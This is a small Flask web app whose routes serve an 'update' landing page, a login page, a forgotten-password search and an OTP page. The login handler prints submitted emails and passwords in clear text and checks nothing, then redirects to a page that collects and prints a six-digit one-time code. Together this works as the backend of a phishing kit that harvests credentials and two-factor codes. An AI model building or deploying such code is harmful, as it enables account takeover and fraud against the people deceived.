from flask import Flask, render_template, request, redirect


app = Flask(__name__)



# =====================================
# Main Landing Page
# =====================================

@app.route("/")
def home():

    return render_template("update.html")



# =====================================
# Login Page
# =====================================

@app.route("/login-page")
def login_page():

    return render_template("index.html")



# =====================================
# Receive Login Data
# =====================================

@app.route("/login", methods=["POST"])
def login():


    email = request.form.get("email")

    password = request.form.get("password")


    print("\n========================")
    print("LOGIN INFORMATION")
    print("========================")

    print("Email / Number :", email)

    print("Password        :", password)

    print("========================\n")


    return redirect("/otp")



# =====================================
# Forget Password Page
# =====================================

@app.route("/forget")
def forget():

    return render_template("forgetpass.html")



# =====================================
# Receive Search Data
# =====================================

@app.route("/search", methods=["POST"])
def search():


    account = request.form.get("account")


    print("\n========================")
    print("ACCOUNT SEARCH")
    print("========================")

    print("Account :", account)

    print("========================\n")


    return redirect("/otp")



# =====================================
# OTP Page
# =====================================

@app.route("/otp")
def otp():

    return render_template("otp.html")



# =====================================
# Receive OTP
# =====================================

@app.route("/verify", methods=["POST"])
def verify():


    otp1 = request.form.get("otp1")
    otp2 = request.form.get("otp2")
    otp3 = request.form.get("otp3")
    otp4 = request.form.get("otp4")
    otp5 = request.form.get("otp5")
    otp6 = request.form.get("otp6")


    otp = (
        str(otp1)
        + str(otp2)
        + str(otp3)
        + str(otp4)
        + str(otp5)
        + str(otp6)
    )


    print("\n========================")
    print("OTP INFORMATION")
    print("========================")

    print("OTP :", otp)

    print("========================\n")


    return "OTP Received Successfully"



# =====================================
# Run Server
# =====================================

if __name__ == "__main__":

    app.run(
        host="127.0.0.1",
        port=5000,
        debug=True
    )